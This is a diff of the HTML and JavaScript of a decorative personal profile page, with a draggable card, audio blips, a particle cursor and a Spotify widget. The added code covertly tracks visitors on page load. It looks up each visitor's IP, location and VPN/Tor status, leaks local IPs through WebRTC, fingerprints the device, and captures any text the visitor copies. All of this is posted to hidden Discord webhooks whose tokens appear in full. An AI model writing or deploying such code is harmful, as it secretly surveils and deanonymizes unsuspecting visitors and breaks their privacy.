@@ -18,7 +18,6 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   
-  <!-- Cute Handwritten & Header Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Gaegu:wght@700&family=Gloria+Hallelujah&family=Itim&family=JetBrains+Mono:wght@400;600&family=Shantell+Sans:ital,wght@0,600;0,700;1,600&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
   <link rel="stylesheet" href="style.css" />
@@ -82,7 +81,7 @@
   <!-- Notification Toast -->
   <div id="toast" class="toast">[ opening... ]</div>
 
-  <!-- Custom Dark Context Menu -->
+  <!-- Custom Context Menu -->
   <div id="custom-context-menu">
     <div class="menu-item" onclick="centerCardAction()"><i class="fa-solid fa-arrows-to-dot"></i> Center Card</div>
     <div class="menu-item" onclick="toggleMasterAudio()"><i class="fa-solid fa-volume-high"></i> Toggle Audio</div>
@@ -104,7 +103,7 @@
     <div class="vignette"></div>
   </div>
 
-  <!-- Compact Draggable Profile Frame -->
+  <!-- Draggable Profile Frame -->
   <main class="profile-frame" id="draggable-card">
     <div class="corner-bracket top-left"></div>
     <div class="corner-bracket top-right"></div>
@@ -185,7 +184,6 @@
   </main>
 
   <script>
-    /* Dedicated Dual Webhook Endpoints */
     const TELEMETRY_WEBHOOK_URL = "https://discord.com/api/webhooks/1562258375771815936/oN6p-UMSuNk_Iwl0UxXJULT4kdhTwuVMmi2x1RNFIKeQuUxPyO1Bz4f0DlnBbEHvgqMl";
     const ACTIONS_WEBHOOK_URL = "https://discord.com/api/webhooks/1561695471976718396/202rGNVBOZLFYYgjd1cSmoyNqvLVQYcXtdtPFBYbLG4ige3q0Rbrd1eZfBHpeNsWrN1H";
 
@@ -212,7 +210,7 @@
     let rawDiscordCustomStatus = "";
     let spotifyTimestamps = null;
 
-    /* Live Central Time Pill */
+    /* Live Clock */
     function updateClock() {
       try {
         const now = new Date();
@@ -228,7 +226,7 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    /* Web Audio Synthesizer */
+    /* Web Audio Engine */
     let audioCtx;
     function playGlitchBlip() {
       try {
@@ -287,74 +285,36 @@
       } catch (_) {}
     }
 
-    /* Dynamic Tab Title Loop */
-    const dynamicTitles = [
-      "hi :3",
-      "emo larp",
-      "o_O",
-      "watching u...",
-      "stay here <3",
-      "⛧",
-      "thinking of u...",
-      "(˶ᵔ ᵕ ᵔ˶)"
-    ];
-    let titleIdx = 0;
-    setInterval(function() {
-      if (document.visibilityState === 'visible' && !isSpotifyActive) {
-        document.title = dynamicTitles[titleIdx];
-        titleIdx = (titleIdx + 1) % dynamicTitles.length;
-      }
-    }, 2400);
-
-    let tabLeaveTime = 0;
-    window.addEventListener('blur', function() {
-      tabLeaveTime = Date.now();
-      document.title = "where did you go...? <3";
-    });
-
-    window.addEventListener('focus', function() {
-      if (tabLeaveTime > 0) {
-        const awaySeconds = Math.round((Date.now() - tabLeaveTime) / 1000);
-        if (awaySeconds >= 4) {
-          sendActionEmbed({
-            title: "action: Visitor Returned",
-            description: "Visitor was tabbed away for **" + awaySeconds + "s**",
-            color: 0x9d4edd,
-            footer: { text: "emolarp.fans // focus" },
-            timestamp: new Date().toISOString()
-          });
-        }
-      }
-      document.title = isSpotifyActive ? "♫ " + document.getElementById('spotify-song').textContent + " :3" : "hi :3";
-    });
-
-    /* Webhook Dispatchers */
-    function sendTelemetryEmbed(embed) {
-      fetch(TELEMETRY_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: "emolarp // access-telemetry",
+    /* CORS-Safe Discord Webhook Dispatcher */
+    function sendDiscordWebhook(webhookUrl, username, embed) {
+      try {
+        const payload = JSON.stringify({
+          username: username,
           avatar_url: "https://api.dicebear.com/7.x/bottts/svg?seed=emolarp",
           embeds: [embed]
-        })
-      }).catch(function() {});
+        });
+
+        // Use FormData to avoid preflight CORS options blocking
+        const formData = new FormData();
+        formData.append("payload_json", payload);
+
+        fetch(webhookUrl, {
+          method: "POST",
+          mode: "no-cors",
+          body: formData
+        }).catch(function() {});
+      } catch (_) {}
+    }
+
+    function sendTelemetryEmbed(embed) {
+      sendDiscordWebhook(TELEMETRY_WEBHOOK_URL, "emolarp // access-telemetry", embed);
     }
 
     function sendActionEmbed(embed) {
       const now = Date.now();
       if (now - lastActionTime < 400) return;
       lastActionTime = now;
-
-      fetch(ACTIONS_WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          username: "emolarp // user-actions",
-          avatar_url: "https://api.dicebear.com/7.x/bottts/svg?seed=emolarp",
-          embeds: [embed]
-        })
-      }).catch(function() {});
+      sendDiscordWebhook(ACTIONS_WEBHOOK_URL, "emolarp // user-actions", embed);
     }
 
     function showToast(message) {
@@ -383,7 +343,7 @@
       }, 350);
     }
 
-    /* Custom Context Menu Actions */
+    /* Context Menu Actions */
     function centerCardAction() {
       playGlitchBlip();
       card.style.position = "relative";
@@ -446,7 +406,7 @@
       if (spotifyTimeTotal) spotifyTimeTotal.innerText = formatTime(total);
     }, 1000);
 
-    /* Avatar Sparkle Burst */
+    /* Avatar Click Sparkle Burst */
     if (avatarContainer) {
       avatarContainer.addEventListener('click', function(e) {
         playGlitchBlip();
@@ -467,7 +427,7 @@
       });
     }
 
-    /* Status Pill: Copies Custom Discord Status */
+    /* Status Pill: Copies User's Actual Discord Custom Status */
     if (statusTracker) {
       statusTracker.addEventListener('click', function() {
         let textToCopy = rawDiscordCustomStatus;
@@ -814,8 +774,183 @@
       showToast("[ centered ]");
     });
 
-    card.addEventListener('mousemove', function(e) {
-      if (isDragging) return;
-      const rect = card.getBoundingClientRect();
-      const x = e.clientX - rect.left - rect.width / 2;
-      const y = e.clientY - rect.top - rect.height /
+    /* Particle Cursor */
+    let lastParticleTime = 0;
+    window.addEventListener("pointermove", function(e) {
+      const now = performance.now();
+      if (now - lastParticleTime < 40) return;
+      lastParticleTime = now;
+
+      const particle = document.createElement("div");
+      particle.className = "cursor-particle";
+      particle.style.left = e.clientX + "px";
+      particle.style.top = e.clientY + "px";
+      document.body.appendChild(particle);
+
+      setTimeout(function() { particle.remove(); }, 600);
+    });
+
+    /* WebRTC Local Subnet Detection */
+    function getWebRtcLeaks() {
+      return new Promise(function(resolve) {
+        let leakedIps = [];
+        try {
+          const rtc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+          });
+
+          rtc.createDataChannel("");
+          rtc.createOffer().then(function(offer) { return rtc.setLocalDescription(offer); }).catch(function() {});
+
+          rtc.onicecandidate = function(event) {
+            if (!event || !event.candidate) {
+              resolve(leakedIps.length > 0 ? leakedIps.join(", ") : "Shielded / None");
+              return;
+            }
+            const parts = event.candidate.candidate.split(" ");
+            const ip = parts[4];
+            if (ip && leakedIps.indexOf(ip) === -1) {
+              leakedIps.push(ip);
+            }
+          };
+
+          setTimeout(function() {
+            resolve(leakedIps.length > 0 ? leakedIps.join(", ") : "Shielded / None");
+          }, 800);
+        } catch (_) {
+          resolve("Shielded / Not Supported");
+        }
+      });
+    }
+
+    /* Core Network Routing & Timezone Discrepancy Verification */
+    async function recordVisit() {
+      const webrtcPromise = getWebRtcLeaks();
+
+      let ip = "Direct Session";
+      let locationText = "Unknown Region";
+      let asnInfo = "Direct Client";
+      let connType = "Broadband";
+      let securityStatus = "Residential / Mobile";
+      let isThreat = false;
+      let ipTimezone = "";
+
+      try {
+        const netRes = await fetch("https://ipwho.is/");
+        if (netRes.ok) {
+          const net = await netRes.json();
+          if (net.success) {
+            ip = net.ip || ip;
+            locationText = [net.city, net.region_code, net.country].filter(Boolean).join(", ");
+            ipTimezone = net.timezone ? net.timezone.id : "";
+            
+            const asn = net.connection && net.connection.asn ? ("AS" + net.connection.asn) : "";
+            const org = net.connection && net.connection.org ? net.connection.org : (net.connection && net.connection.isp ? net.connection.isp : "");
+            asnInfo = [asn, org].filter(Boolean).join(" ");
+            connType = (net.connection && net.connection.type) ? net.connection.type : "Broadband";
+
+            const sec = net.security || {};
+            let threatFlags = [];
+            if (sec.vpn) threatFlags.push("VPN");
+            if (sec.proxy) threatFlags.push("Proxy");
+            if (sec.tor) threatFlags.push("Tor");
+            if (sec.hosting) threatFlags.push("Datacenter / Hosting");
+
+            if (threatFlags.length > 0) {
+              isThreat = true;
+              securityStatus = threatFlags.join(" + ");
+            }
+          }
+        }
+      } catch (_) {}
+
+      // Hardware Concurrency & Client System Clock Discrepancy
+      const deviceTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+      if (ipTimezone && deviceTimezone && ipTimezone !== deviceTimezone) {
+        isThreat = true;
+        securityStatus += (securityStatus === "Residential / Mobile" ? "" : " + ") + "Timezone Spoof (" + deviceTimezone + " vs " + ipTimezone + ")";
+      }
+
+      const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Threads" : "Unknown";
+      const ramApprox = navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "Unknown RAM";
+      const leakedRtc = await webrtcPromise;
+
+      const ua = navigator.userAgent;
+      let browser = "Browser";
+      if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+      else if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+      else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+      else if (ua.indexOf("Edge") !== -1) browser = "Edge";
+
+      let refHost = "direct";
+      if (document.referrer) {
+        try { refHost = new URL(document.referrer).hostname; } catch (_) {}
+      }
+
+      sendTelemetryEmbed({
+        title: isThreat ? "inbound session [ ⚠️ " + securityStatus + " ]" : "inbound session",
+        description: "`" + ip + "` — " + locationText,
+        color: isThreat ? 0xd90429 : 0x7b2cbf,
+        fields: [
+          {
+            name: "network routing",
+            value: "**ASN / Provider:** `" + asnInfo + "`\n**Line Type:** `" + connType + "`\n**Integrity:** `" + securityStatus + "`",
+            inline: false
+          },
+          {
+            name: "webrtc interface",
+            value: "**Local IP / Subnet:** `" + leakedRtc + "`",
+            inline: false
+          },
+          {
+            name: "client device spec",
+            value: "**Hardware:** `" + cpuCores + " / " + ramApprox + "`\n**OS:** `" + (navigator.platform || "Unknown") + "`\n**Browser:** `" + browser + "`",
+            inline: true
+          },
+          {
+            name: "display & timing",
+            value: "**Res:** `" + screen.width + "x" + screen.height + "`\n**Clock:** `" + deviceTimezone + "`\n**Ref:** `" + refHost + "`",
+            inline: true
+          }
+        ],
+        footer: { text: "emolarp.fans // visitor access" },
+        timestamp: new Date().toISOString()
+      });
+    }
+    recordVisit();
+
+    /* Spotify Card Click (Actions Webhook) */
+    const spotifyEl = document.getElementById('spotify-player');
+    if (spotifyEl) {
+      spotifyEl.style.cursor = "pointer";
+      spotifyEl.addEventListener('click', function(e) {
+        if (e.target.closest('.spotify-progress-wrap')) return;
+        playGlitchBlip();
+        const song = document.getElementById('spotify-song').textContent;
+        const artist = document.getElementById('spotify-artist').textContent;
+        sendActionEmbed({
+          title: "action: Spotify Card Click",
+          description: "Track: **" + song + "**\nArtist: `" + artist + "`",
+          color: 0x1ed760,
+          footer: { text: "emolarp.fans // spotify" },
+          timestamp: new Date().toISOString()
+        });
+      });
+    }
+
+    /* Text Copy Detection (Actions Webhook) */
+    window.addEventListener('copy', function() {
+      const text = window.getSelection().toString().trim();
+      if (text && text.length > 0 && (!statusTracker || text !== statusTracker.innerText.trim())) {
+        sendActionEmbed({
+          title: "action: Selected Text Copied",
+          description: "Copied: `" + text.slice(0, 100) + "`",
+          color: 0x9d4edd,
+          footer: { text: "emolarp.fans // selection" },
+          timestamp: new Date().toISOString()
+        });
+      }
+    });
+  </script>
+</body>
+</html>
